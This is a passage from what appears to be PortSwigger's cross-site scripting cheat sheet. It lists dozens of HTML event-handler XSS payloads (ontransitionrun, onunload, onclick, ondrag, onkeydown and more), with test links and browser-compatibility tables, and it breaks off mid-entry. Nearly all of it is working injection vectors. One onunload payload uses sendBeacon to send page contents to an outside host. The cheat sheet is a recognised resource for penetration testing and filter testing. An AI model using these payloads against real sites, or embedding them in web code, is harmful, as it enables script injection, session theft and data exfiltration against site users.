Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nontransitionrun\n\nFires when a CSS transition begins\n\n [`<style>:target {transform: rotate(180deg);}</style><xss id=x style=\"transition:transform 2s\" ontransitionrun=print()></xss>`](http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20onload%3D%22src%3Dsrc%2B%27%23x%27%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cstyle%3E%3Atarget%20%7Btransform%3A%20rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cxss%20id%3Dx%20style%3D%2522transition%3Atransform%202s%2522%20ontransitionrun%3Dprint%28%29%3E%3C%2Fxss%3E%22%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ontransitionrun)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nontransitionstart\n\nFires when a CSS transition starts\n\n [`<style>:target {color:red;}</style><xss id=x style=\"transition:color 1s\" ontransitionstart=alert(1)></xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cstyle%3E%3Atarget%20%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cxss%20id%3Dx%20style%3D%22transition%3Acolor%201s%22%20ontransitionstart%3Dalert%281%29%3E%3C%2Fxss%3E&context=html#x)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ontransitionstart)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonunhandledrejection\n\nFires when a promise isn't handled\n\n [`<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>`](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onunhandledrejection%3Dalert%281%29%3E%3Cscript%3Efetch%28%27%2F%2Fxyz%27%29%3C%2Fscript%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onunhandledrejection)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonunload\n\nFires when the page is unloaded\n\n [`<body onunload=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)>`](https://portswigger-labs.net/xss/xss.php?x=%3Cbody%20onunload%3Dnavigator.sendBeacon%28%27%2F%2Fhttps%3A%2F%2Fssl.portswigger-labs.net%2F%27%2Cdocument.body.innerHTML%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onunload)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonwebkitanimationend\n\nFires when a CSS animation ends\n\n [`<style>@keyframes x{}</style><xss style=\"animation-name:x\" onwebkitanimationend=\"alert(1)\"></xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cxss%20style%3D%22animation-name%3Ax%22%20onwebkitanimationend%3D%22alert%281%29%22%3E%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onwebkitanimationend)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonwebkitanimationiteration\n\nFires when a CSS animation repeats\n\n [`<style>@keyframes slidein {}</style><xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onwebkitanimationiteration=\"alert(1)\"></xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cstyle%3E%40keyframes%20slidein%20%7B%7D%3C%2Fstyle%3E%3Cxss%20style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22%20onwebkitanimationiteration%3D%22alert%281%29%22%3E%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onwebkitanimationiteration)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonwebkitanimationstart\n\nFires when a CSS animation starts\n\n [`<style>@keyframes x{}</style><xss style=\"animation-name:x\" onwebkitanimationstart=\"alert(1)\"></xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cstyle%3E%40keyframes%20x%7B%7D%3C%2Fstyle%3E%3Cxss%20style%3D%22animation-name%3Ax%22%20onwebkitanimationstart%3D%22alert%281%29%22%3E%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onwebkitanimationstart)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonwebkitplaybacktargetavailabilitychanged\n\nFires when the availability of an AirPlay playback target changes\n\n [`<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>`](https://portswigger-labs.net/xss/xss.php?x=%3Caudio%20onwebkitplaybacktargetavailabilitychanged%3Dalert%281%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onwebkitplaybacktargetavailabilitychanged)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonwebkittransitionend\n\nFires when a CSS transition ends\n\n [`<style>:target {color:red;}</style><xss id=x style=\"transition:color 1s\" onwebkittransitionend=alert(1)></xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cstyle%3E%3Atarget%20%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cxss%20id%3Dx%20style%3D%22transition%3Acolor%201s%22%20onwebkittransitionend%3Dalert%281%29%3E%3C%2Fxss%3E&context=html#x)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onwebkittransitionend)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\n### Event handlers that do require user interaction\n\nEvent:\n\nDescription:\n\nTag:\n\nCode:\n\nCopy:\n\nonafterprint\n\nFires after the page is printed\n\n [`<body onafterprint=alert(1)>`](http://subdomain1.portswigger-labs.net/xss/xss.php?x=%3Ciframe%20onload%3D%22print%28%29%22%20src%3D%22https%3A%2F%2Fportswigger-labs.net%2Fxss%2Fxss.php%3Fx%3D%3Cbody%20onafterprint%3Dalert%281%29%3E%22%3E%3C%2Fiframe%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onafterprint)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonauxclick\n\nFires when right clicking or using the middle button of the mouse\n\n [`<input onauxclick=alert(1)>`](https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20onauxclick%3Dalert%281%29%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onauxclick)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonbeforecopy\n\nRequires you copy a piece of text\n\n [`<a onbeforecopy=\"alert(1)\" contenteditable>test</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20onbeforecopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onbeforecopy)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonbeforecut\n\nRequires you cut a piece of text\n\n [`<a onbeforecut=\"alert(1)\" contenteditable>test</a>`](https://portswigger-labs.net/xss/xss.php?x=%3Ca%20onbeforecut%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fa%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onbeforecut)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonbeforeinput\n\nFires when the value of the element is about to be modified\n\n [`<xss contenteditable onbeforeinput=alert(1)>test`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20contenteditable%20onbeforeinput%3Dalert%281%29%3Etest&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onbeforeinput)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonbeforetoggle\n\nFires before the a popop element is toggled\n\n [`<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cbutton%20popovertarget%3Dx%3EClick%20me%3C%2Fbutton%3E%3Cxss%20onbeforetoggle%3Dalert%281%29%20popover%20id%3Dx%3EXSS%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onbeforetoggle)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does not work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonblur\n\nFires when an element loses focus\n\n [`<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onblur%3Dalert%281%29%20id%3Dx%20tabindex%3D1%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E%3Cinput%20value%3Dclickme%3E&context=html#x)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onblur)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonchange\n\nRequires as change of value\n\n [`<input onchange=alert(1) value=xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20onchange%3Dalert%281%29%20value%3Dxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onchange)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonclick\n\nRequires a click of the element\n\n [`<xss onclick=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onclick%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onclick)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonclose\n\nFires when a dialog is closed\n\n [`<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>`](https://portswigger-labs.net/xss/xss.php?x=%3Cdialog%20open%20onclose%3Dalert%281%29%3E%3Cform%20method%3Ddialog%3E%3Cbutton%3EXSS%3C%2Fbutton%3E%3C%2Fform%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onclose)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\noncontextmenu\n\nTriggered when right clicking to show the context menu\n\n [`<xss oncontextmenu=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20oncontextmenu%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#oncontextmenu)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\noncopy\n\nRequires you copy a piece of text\n\n [`<xss oncopy=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20oncopy%3Dalert%281%29%20value%3D%22XSS%22%20autofocus%20tabindex%3D1%20style%3Ddisplay%3Ablock%3Etest&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#oncopy)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\noncut\n\nRequires you cut a piece of text\n\n [`<xss oncut=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20oncut%3Dalert%281%29%20value%3D%22XSS%22%20autofocus%20tabindex%3D1%20style%3Ddisplay%3Ablock%3Etest&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#oncut)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nondblclick\n\nTriggered when double clicking the element\n\n [`<xss ondblclick=\"alert(1)\" autofocus tabindex=1 style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20ondblclick%3D%22alert%281%29%22%20autofocus%20tabindex%3D1%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ondblclick)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nondrag\n\nTriggered dragging the element\n\n [`<xss draggable=\"true\" ondrag=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20draggable%3D%22true%22%20ondrag%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ondrag)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nondragend\n\nTriggered dragging is finished on the element\n\n [`<xss draggable=\"true\" ondragend=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20draggable%3D%22true%22%20ondragend%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ondragend)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nondragenter\n\nRequires a mouse drag\n\n [`<xss draggable=\"true\" ondragenter=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20draggable%3D%22true%22%20ondragenter%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ondragenter)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nondragexit\n\nTriggered when dragging the element\n\n [`<xss draggable=\"true\" ondragexit=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20draggable%3D%22true%22%20ondragexit%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ondragexit)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\nondragleave\n\nRequires a mouse drag\n\n [`<xss draggable=\"true\" ondragleave=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20draggable%3D%22true%22%20ondragleave%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ondragleave)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nondragover\n\nTriggered dragging over an element\n\n [`<div draggable=\"true\" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cxss%20ondragover%3Dalert%281%29%20contenteditable%20style%3Ddisplay%3Ablock%3Edrop%20here%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ondragover)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nondragstart\n\nRequires a mouse drag\n\n [`<xss draggable=\"true\" ondragstart=\"alert(1)\" style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20draggable%3D%22true%22%20ondragstart%3D%22alert%281%29%22%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ondragstart)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nondrop\n\nTriggered dropping a draggable element\n\n [`<div draggable=\"true\" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cxss%20ondrop%3Dalert%281%29%20contenteditable%20style%3Ddisplay%3Ablock%3Edrop%20here%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#ondrop)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonfocusout\n\nFires when an element loses focus\n\n [`<xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onfocusout%3Dalert%281%29%20autofocus%20tabindex%3D1%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E%3Cinput%20value%3Dclickme%3E&context=html#x)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onfocusout)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonformdata\n\nTriggered when a form is submitted\n\n [`<form onformdata=\"alert(1)\"><button>Click</button></form>`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%20onformdata%3D%22alert%281%29%22%3E%3Cbutton%3EClick%3C%2Fbutton%3E%3C%2Fform%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onformdata)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonfullscreenchange\n\nFires when a video changes full screen status\n\n [`<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>`](https://portswigger-labs.net/xss/xss.php?x=%3Cvideo%20onfullscreenchange%3Dalert%281%29%20src%3Dvalidvideo.mp4%20controls%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onfullscreenchange)\n\nCompatibility:\n\n![Does not work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does not work in Safari](/web-security/images/browser-logos/safari.svg)\n\noninput\n\nRequires as change of value\n\n [`<input oninput=alert(1) value=xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cinput%20oninput%3Dalert%281%29%20value%3Dxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#oninput)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\noninvalid\n\nRequires a form submission with an element that does not satisfy its constraints such as a required attribute.\n\n [`<form><input oninvalid=alert(1) required><input type=submit>`](https://portswigger-labs.net/xss/xss.php?x=%3Cform%3E%3Cinput%20oninvalid%3Dalert%281%29%20required%3E%3Cinput%20type%3Dsubmit%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#oninvalid)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonkeydown\n\nTriggered when a key is pressed\n\n [`<xss onkeydown=\"alert(1)\" contenteditable style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onkeydown%3D%22alert%281%29%22%20contenteditable%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onkeydown)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonkeypress\n\nTriggered when a key is pressed\n\n [`<xss onkeypress=\"alert(1)\" contenteditable style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onkeypress%3D%22alert%281%29%22%20contenteditable%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onkeypress)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonkeyup\n\nTriggered when a key is released\n\n [`<xss onkeyup=\"alert(1)\" contenteditable style=display:block>test</xss>`](https://portswigger-labs.net/xss/xss.php?x=%3Cxss%20onkeyup%3D%22alert%281%29%22%20contenteditable%20style%3Ddisplay%3Ablock%3Etest%3C%2Fxss%3E&context=html)\n\n ![Copy vector to clipboard](/web-security/images/icons/copy.svg) Copy[![Jump to the code](/web-security/images/icons/link.svg) Link](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#onkeyup)\n\nCompatibility:\n\n![Does work in Chrome](/web-security/images/browser-logos/chrome.svg)![Does work in Firefox](/web-security/images/browser-logos/firefox.svg)![Does work in Safari](/web-security/images/browser-logos/safari.svg)\n\nonmousedown\n\nTriggered when the mouse is pressed\n\n [`<xss onmousedown=\"alert(1)\" 